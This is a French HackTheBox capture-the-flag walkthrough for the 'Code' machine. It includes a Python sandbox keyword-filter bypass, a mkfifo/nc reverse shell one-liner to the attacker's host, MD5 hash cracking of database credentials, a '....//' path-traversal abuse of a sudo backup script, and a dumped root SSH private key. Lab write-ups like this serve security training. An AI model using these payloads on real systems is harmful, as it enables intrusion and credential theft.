---
title: HTB | Code
description: Code is an easy Linux machine featuring a Python Code Editor web application that is vulnerable to remote code execution by achieving a Python  Jail Bypass. After gaining access as the app-production user, crackable credentials can be found in an sqlite3 database file. Using these credentials, access is granted to another user, martin, who has sudo permissions to a backup utility script, backy.sh. This script includes a section of vulnerable code, which, when exploited, allows us to escalate our privileges by creating a copy of the root folder.
slug: code-htb
date: 2025-03-26 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Code cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Code</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.11.62</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Users
```bash
martin:nafeelswordsmaster
development:development
```

## Enumeration

### nmap
```bash
┌──(kali㉿kali)-[~/htb]
└─$ nmap -sC -sV -An -p- -vvv -T4 10.10.11.62
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrE0z9yLzAZQKDE2qvJju5kq0jbbwNh6GfBrBu20em8SE/I4jT4FGig2hz6FHEYryAFBNCwJ0bYHr3hH9IQ7ZZNcpfYgQhi8C+QLGg+j7U4kw4rh3Z9wbQdm9tsFrUtbU92CuyZKpFsisrtc9e7271kyJElcycTWntcOk38otajZhHnLPZfqH90PM+ISA93hRpyGyrxj8phjTGlKC1O0zwvFDn8dqeaUreN7poWNIYxhJ0ppfFiCQf3rqxPS1fJ0YvKcUeNr2fb49H6Fba7FchR8OYlinjJLs1dFrx0jNNW/m3XS3l2+QTULGxM5cDrKip2XQxKfeTj4qKBCaFZUzknm27vHDW3gzct5W0lErXbnDWQcQZKjKTPu4Z/uExpJkk1rDfr3JXoMHaT4zaOV9l3s3KfrRSjOrXMJIrImtQN1l08nzh/Xg7KqnS1N46PEJ4ivVxEGFGaWrtC1MgjMZ6FtUSs/8RNDn59Pxt0HsSr6rgYkZC2LNwrgtMyiiwyas=
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDiXZTkrXQPMXdU8ZTTQI45kkF2N38hyDVed+2fgp6nB3sR/mu/7K4yDqKQSDuvxiGe08r1b1STa/LZUjnFCfgg=
|   256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8Cwf2cBH9EDSARPML82QqjkV811d+Hsjrly11/PHfu
5000/tcp open  http    syn-ack Gunicorn 20.0.4
|_http-title: Python Code Editor
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Foothold

### Python sandbox (port 5000)
Sur le port 5000, on trouve une sandbox, permettant d'executer du code **Python**. Cependant, après quelques tests on remarque que certains mot-clés sont interdits, empêchant l'execution de certaines commandes.

### Restricted keywords
J'ai fait une liste au fur et a mesure des keywords non acceptés
```bash
## Restricted keywords
import
os
read
popen
open
__builtins__
```

### app-production reverse shell
J'ai finalement réussi à bypasser la restriction en trouvant les mots clés permettant une execution de code à distance :
``` bash
## On bypass la restriction sur le mot clé "os"
lib = globals()["o"+"s"]

## on bypass la restriction sur le mot clé "system"
cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.4 1337 >/tmp/f"
getattr(lib, "syst" + "em")(cmd)  # Exécuter la commande

## Affiche la liste des dossiers
print(lib.listdir("/home/app-production"))
```

```bash
┌──(kali㉿kali)-[~/htb/Code]
└─$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.62] 32960
bash: cannot set terminal process group (5014): Inappropriate ioctl for device
bash: no job control in this shell
app-production@code:~/app$ whoami
whoami
app-production
app-production@code:~/app$ cat ../user.txt
cat ../user.txt
8f81.....e49f
```


### database.db : martin's password
On trouve un fichier database.db.
```bash
app-production@code:~/app$ grep -rni pass
app.py:17:    password = db.Column(db.String(80), nullable=False)
app.py:43:        password = hashlib.md5(request.form['password'].encode()).hexdigest()
app.py:48:            new_user = User(username=username, password=password)
app.py:60:        password = hashlib.md5(request.form['password'].encode()).hexdigest()
app.py:61:        user = User.query.filter_by(username=username, password=password).first()
...
...
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>
Binary file instance/database.db matches
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>
```
On trouve rapidement un hachage du  mot de passe de martin, en affichant directement database.db sans meme passer par sqlite.
```bash
app-production@code:~/app$ grep -rnia martin
## 3de6f30c4a09c27fc71932bfc68474be <-----------
���QQR*Mmartin3de6f30c4a09c27fc71932bfc68474be/#Mdevelopment759b74ce43947f5f4c91aeddc3e5bad3
���&$nceCprint("Functionality test")Testent
$ hashcat -m 0 hash.txt --wordlist ~/wordlists/rockyou.txt --show
3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster
```
development account :
```bash
$ hashcat -m 0 hash2.txt --wordlist ~/wordlists/rockyou.txt --show
759b74ce43947f5f4c91aeddc3e5bad3:development
```

## Privilege Escalation

### Enumeration with martin
Martin peut executer en tant que root le script /usr/bin/backy.sh :
```bash
martin@code:/home/app-production/app$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

### Exploit : /usr/bin/backy.sh
On met "...." au lieu de ".." et "//" au lieu de "/"
car il remplace "../" quand il le voit. mais quand on eneleve "../" dans mon cas, ca reconstruit un autre "../" ! Donc ca marche.
```bash
martin@code:~$ cat t.json
{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": [
    "/home/....//root/root.txt"
  ],
  "exclude": [
    ".*"
  ]
}

------------------------------------
## En remplacant par ca, on archive bien le dossier root
martin@code:~$ cat task.json
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/....//root",
                "/var/....//root"
        ]
}
```

```bash
martin@code:~$ sudo /usr/bin/backy.sh ./task.json 
2025/03/26 11:09:19 🍀 backy 1.2
2025/03/26 11:09:19 📋 Working with ./task.json ...
2025/03/26 11:09:19 💤 Nothing to sync
2025/03/26 11:09:19 📤 Archiving: [/home/../root /var/../root]
2025/03/26 11:09:19 📥 To: /home/martin/backups ...
2025/03/26 11:09:19 📦
2025/03/26 11:09:19 📦 📦


martin@code:~/backups$ tar -xjf code_var_.._root_2025_March.tar.bz2 
martin@code:~/backups$ ls
code_home_app-production_app_2024_August.tar.bz2  code_home_.._root_2025_March.tar.bz2  code_var_.._root_2025_March.tar.bz2  root  task.json
martin@code:~/backups$ cd root/
martin@code:~/backups/root$ ls
root.txt  scripts
martin@code:~/backups/root$ cat root.txt 
80a6.....33d8
```

### SSH root
on récupère aussi les clés ssh de root :
```bash
martin@code:~/backups/root$ cd .ssh/
martin@code:~/backups/root/.ssh$ ls
authorized_keys  id_rsa
martin@code:~/backups/root/.ssh$ cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
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
hdENGN+hVCh//jFwAAAAlyb290QGNvZGU=
-----END OPENSSH PRIVATE KEY-----
martin@code:~/backups/root/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/E/D3RVElqOCSPDFmpevzrlXwd78c0dWWGnQI/fo6wpKLQPMhngqyp+NOL9YBFzEtN7iWRVJUhXbkvLkzoR6ZZ44oDq9040/RBS/oXXGPx/h4KGt2nsE6FF7T7NYmdrx1gy25HYrQLFt136q8zuhAs9F6VAjLGhHi6eHrA6gh/gQvfhoS9AO7H7cawVSdPhgw2WMCzHJUWfebNHudRnwEAf9j3FX8q41I8PhKVWoGJSNQp+zbAPeCMsDhlBl4zmEAlKZV5mOl+RA50T774fy3Y/yoaWhsu9uhknauCFj0LCKZfT+DS4e9ylcBzpTwkmqj1TjVbOigCLpNbFZht07eaMmGbSy6cKKjnFO1zjgzSduGRFAGWI+eBoFiV4p2+0aJw8lvUu2O0TmUenL40+zUHgQjH5mUFVoVshqrGmoNUNQK/SqlrEgqHH+UqbBeJYRAiJ7R9eissOqyMvvkzu1j+78zvEG4aX4scY0GcKy+Mu8gDp8v325X4FMqukeGBX0= root@code
```
On se connecte en utilisant la cle id_rsa recupere precedemment.
```bash
┌──(kali㉿kali)-[~/htb/Code]
└─$ ssh root@10.10.11.62 -i id_rsa
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed 26 Mar 2025 12:38:11 PM UTC

  System load:           0.06
  Usage of /:            52.2% of 5.33GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             237
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.62
  IPv6 address for eth0: dead:beef::250:56ff:fe94:61f7


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Mar 26 12:38:11 2025 from 10.10.14.4
root@code:~# whoami
root
root@code:~# cat root.txt
80a6.....33d8
```